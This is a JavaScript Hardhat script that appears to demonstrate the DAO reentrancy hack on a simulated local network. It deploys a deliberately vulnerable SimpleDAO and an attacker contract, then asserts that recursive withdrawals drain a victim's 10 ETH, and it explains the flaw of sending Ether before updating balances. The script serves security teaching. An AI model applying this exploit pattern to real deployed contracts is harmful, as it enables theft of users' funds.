import { assertEqual, balance, deploy, eth, fmt, runtime, withLog } from "./lib.js";

await withLog("logs/dao_attack.log", async () => {
  console.log("# DAO Hack / Reentrancy - vulnerable SimpleDAO");
  console.log("Network: Hardhat in-memory simulated network only. No live RPC or wallet used.");

  const { provider, signers } = await runtime();
  const [deployer, victim, attackerEOA] = signers;

  const dao = await deploy("SimpleDAO", deployer);
  const attacker = await deploy("DAOAttacker", attackerEOA, [await dao.getAddress()]);
  const daoAddress = await dao.getAddress();
  const attackerAddress = await attacker.getAddress();

  console.log(`SimpleDAO: ${daoAddress}`);
  console.log(`DAOAttacker: ${attackerAddress}`);

  await (await dao.connect(victim).donate(await victim.getAddress(), { value: eth(10) })).wait();
  console.log(`Victim deposits 10 ETH. Initial DAO balance before attacker seed: ${fmt(await balance(provider, daoAddress))}`);
  console.log("Attacker seeds 1 ETH, then recursively withdraws 1 ETH chunks until the DAO is empty.");

  await (await attacker.connect(attackerEOA).attack(10, { value: eth(1) })).wait();

  const daoAfter = await balance(provider, daoAddress);
  const attackerAfter = await balance(provider, attackerAddress);
  const reentryCount = await attacker.reentryCount();
  console.log(`DAO balance after attack: ${fmt(daoAfter)}`);
  console.log(`Attacker contract balance after attack: ${fmt(attackerAfter)}`);
  console.log(`Recursive calls observed by attacker contract: ${reentryCount}`);
  assertEqual(daoAfter, 0n, "DAO final balance is drained to 0 ETH", fmt);
  assertEqual(attackerAfter, eth(11), "attacker contract captured the 10 ETH victim pool plus its 1 ETH seed", fmt);
  assertEqual(reentryCount, 10n, "recursive withdraw count");
  console.log(`Underflowed recorded attacker DAO balance after attack (legacy Solidity teaching artifact): ${fmt(await dao.balances(attackerAddress))}`);
  console.log("Result: vulnerable contract drained because withdraw() sends Ether before reducing the recorded balance.");
});
